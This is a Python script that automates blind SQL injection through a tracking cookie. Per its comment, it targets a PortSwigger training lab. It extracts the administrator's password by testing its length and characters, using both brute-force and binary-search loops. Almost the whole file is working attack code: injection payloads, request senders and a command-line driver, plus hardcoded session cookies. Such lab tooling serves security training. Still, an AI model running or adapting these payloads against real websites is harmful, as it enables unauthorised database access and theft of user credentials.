#!/usr/bin/env python3

import requests
from requests.models import Response
import urllib3
from sys import argv
from urllib import parse
import string




'''
Comments

Morning if it's morning,
Evening if it's evening 

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

' and SELECT IF(ASCII(SUBSTRING('SQL Tutorial', 1, 1))>100, "yes",  False) --
BinarySearchPayload = " 'AND ( SELECT 'a' FROM users WHERE username='administrator' IF(LENGTH(password))>{NUM}, "yes",  False) ) --"
LowPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
HighPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
EquelPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={num})='a
LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
crakPayload = 'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}

def tryPayload(TargetUrl):
    while True:
        payload = input("Enter input: ")
        if payload == "stop":
            break
        else:
            TargetUrl = TargetUrl+payload
            statusCode = sendRequest(TargetUrl)
            print(statusCode[1])


'''

# diable disable_warnings if thir is proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# change it manuale 
SiteCookies = {'TrackingId': 'gNinnK9vOUZjoKpj' , 'session':'A3hU4fQhtrPBLH8xLFGe7XGI5jda9glq'}


# ================================= Functions ================================= #

# return list [ text of respone , status coe ]
# defualt value their is no cookies or proxies
def sendRequest(TargetUrl , proxies=None , cookies=None):
    try :
        result = requests.get(TargetUrl ,  proxies=proxies , cookies=cookies , verify=False )
        return [result.text, result.status_code]
    except:
        print("error")


def checkResponse(responseStatus , word ):
	if responseStatus :
		if word in responseStatus[0]:
			#print("Found {0}".format(word))
			return True
		elif responseStatus[1] != 200:
			return False


# Url encode the payload 
def encodePayload(payload):
    return parse.quote(payload)


# Find the length of the password by brute Forceing
def BruteForceFindLength(TargetUrl, payload, infectedCookie ,maxLength=50):

    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
    for i in range(1, maxLength+1): # no zero password length , add 1 to reach the given number 
        # Edit the value of the cookie to set the payload in it 
        # Payload must have {passLength} to format it 
        # Updated the Cookie to add the payload to it
        SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(passLength=i))
        
        # send the request with cookies after puting the dynamic payload 
        responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
        
        if responseStatus : 
            # print status code of the response
            print(responseStatus[1],end=" ")
            # Refactor this part - make a fun to check for a dynamic word and return true if it's in
            if "Welcome back!" in responseStatus[0]:
                print("Moer than: " , i) # This means the condition is True && the password length is bigger than i
            elif responseStatus[1] != 200:
                print("\nText\n" , responseStatus[0])
                break
            else:
                print("Done password Length is: " , i)
                break    
        else:
            print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )



def BruteForcePassword(TargetUrl, passwordLength ,infectedCookie, wordlist, payload ):
    crackedPasswod = []
    infectedCookieValue = SiteCookies.get(infectedCookie , "'")
    for i in range(1,passwordLength+1): # To crack the last index
        for passValue in wordlist:
            # Edit the value of the cookie to set the payload in it 
            SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(indexOfletter=i,letter=passValue))
            
            # send the request with cookies after puting the dynamic payload 
            responseStatus = sendRequest(TargetUrl , cookies=SiteCookies , proxies=proxies)
            
            if responseStatus : 
                # print status code of the response
                print(responseStatus[1],end=" ")
                # Refactor this part - make a fun to check for a dynamic word and return true if it's in
                if "Welcome back!" in responseStatus[0]:
                    crackedPasswod.append(passValue) # This means the condition is True
                    print("Index:", i, "is:" , passValue , sep=" ")
                    break
                elif responseStatus[1] != 200:
                    print("\nText\n" , responseStatus[0])
                    print("".join(str(i) for i in crackedPasswod))
                    exit()
                else:
                    print("Index:" , i, "is Not:", passValue, sep=" ")           
            else:
                print("Error - Status code: ",responseStatus[1], "\nText:\n", responseStatus[0] )

    password = "".join(str(i) for i in crackedPasswod)
    print(password)


def binarySearchSendReques(TargetUrl, payload , infectedCookie , infectedCookieValue, operator, testValue , indexOfletter=None ):
	if indexOfletter:
		SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(operator=operator,PasswordValue=testValue, indexOfletter=indexOfletter))
	else:
		#infectedCookieValue = SiteCookies.get(infectedCookie , "'")
		SiteCookies[infectedCookie] = infectedCookieValue + encodePayload(payload.format(operator=operator,PasswordValue=testValue))
	response = sendRequest(TargetUrl , cookies=SiteCookies , proxies=proxies)
	if checkResponse(responseStatus=response, word="Welcome back!") :
		return True
	else:
		return False


# Refactor this using oop
def LengthBinarySearch(TargetUrl , maxPasswordSize , infectedCookie  ):
	# Make array of all posiable numbers
	passLengthRange = [ i for i in range(maxPasswordSize+1)]
	rangeLength = len(passLengthRange) - 1
	low , high = 0 , rangeLength 
    # .format(operator="=<>")
	BinarySearchLengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{PasswordValue})='a"
    # Repeat until the pointers low and high meet each other
    #for i in range(1,PasswordLength):
	#mid = 0
	while low <= high  :
		mid = low + (high - low) // 2
        #BinarySearchLengthPayload.format(operator="=",PasswordLength=passLengthRange[mid])
		if binarySearchSendReques(TargetUrl, BinarySearchLengthPayload, infectedCookie, infectedCookieValue="gNinnK9vOUZjoKpj", operator="=" , testValue=passLengthRange[mid] ) :
			print("Password length is ",passLengthRange[mid])
			return passLengthRange[mid]
		elif binarySearchSendReques(TargetUrl, BinarySearchLengthPayload, infectedCookie, infectedCookieValue="gNinnK9vOUZjoKpj", operator=">" , testValue=passLengthRange[mid] ) :
			low = mid + 1
			print("Password length is Bigger than ",passLengthRange[mid])
		else:
			high = mid - 1
			print("Password length less than ",passLengthRange[mid])
	return "Not Found in this Range"


# Refactor this using oop
def crackBinarySearch(TargetUrl , maxPasswordSize , infectedCookie  ):
	passAsciiRange = [ i for i in range(128)]
	#low , high = 0 , 127
    # .format(operator="=<>")
	BinarySearchCrakPayload = "'AND (SELECT ASCII(SUBSTRING(password,{indexOfletter},1)) FROM users WHERE username='administrator'){operator}'{PasswordValue}"
    # Repeat until the pointers low and high meet each other
    #for i in range(1,PasswordLength):
	#mid = 0
	result = []
	for i in range(1,maxPasswordSize+1):
		low , high = 0 , 127
		while low <= high  :
			mid = low + (high - low) // 2
			#BinarySearchLengthPayload.format(operator="=",PasswordLength=passLengthRange[mid])
			if binarySearchSendReques(TargetUrl, BinarySearchCrakPayload, infectedCookie , infectedCookieValue="gNinnK9vOUZjoKpj", operator="=" , testValue=passAsciiRange[mid] , indexOfletter=i  ) :
				print("Password Assic is ",passAsciiRange[mid])
				result.append(passAsciiRange[mid])
				break
			elif binarySearchSendReques(TargetUrl, BinarySearchCrakPayload, infectedCookie, infectedCookieValue="gNinnK9vOUZjoKpj", operator=">" , testValue=passAsciiRange[mid] , indexOfletter=i ) :
				low = mid + 1
				print("Password Assic is Bigger than ",passAsciiRange[mid])
			else:
				high = mid - 1
				print("Password Assic length less than:",passAsciiRange[mid])
		print("################################# Done The {0} index ##################################".format(i))
	return result



# ================================= Functions ================================= #


# ================================= Main ================================= #


if __name__ == '__main__':

	numberOfArguments = len(argv)
    #if numberOfArguments == 1:
	#    print("-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
	if numberOfArguments == 4:
		TargetUrl=argv[1]
	else:
		print("Traget Url + options\n\n-binaryLength [ expected passLength ] \n-length [ Password Length ] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
		exit()

	crakPayload = "'AND (SELECT SUBSTRING(password,{indexOfletter},1) FROM users WHERE username='administrator')='{letter}"
	LengthPayload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{passLength})='a"

	if argv[2] == "-length":
		Maxlength= int(argv[3])
		BruteForceFindLength(TargetUrl, LengthPayload , infectedCookie="TrackingId" ,maxLength=Maxlength)
	elif argv[2] == "-crack":
		PasswordLength = int(argv[3])
		Wordlist = string.ascii_letters + string.digits
		BruteForcePassword(TargetUrl, passwordLength=PasswordLength, infectedCookie="TrackingId" ,wordlist=Wordlist, payload=crakPayload)
	elif argv[2] == "-binaryLength":
		maxPasswordLength = int(argv[3])
		print(maxPasswordLength)
		PasswordLength = LengthBinarySearch(TargetUrl, maxPasswordSize=maxPasswordLength, infectedCookie="TrackingId" )
		print(PasswordLength)
	elif argv[2] == "-binaryCrack":
		maxPasswordLength = int(argv[3])
		print(maxPasswordLength)
		PasswordLength = crackBinarySearch(TargetUrl, maxPasswordSize=maxPasswordLength, infectedCookie="TrackingId" )
		for i in PasswordLength:
			print(chr(i),end="")
	else:
		print("-binaryLength [ expected passLength ] \n-length [ Password Length] To BruteForce Finding password length\n-crack [ Max password length ] edit the wordlist if you want   ")
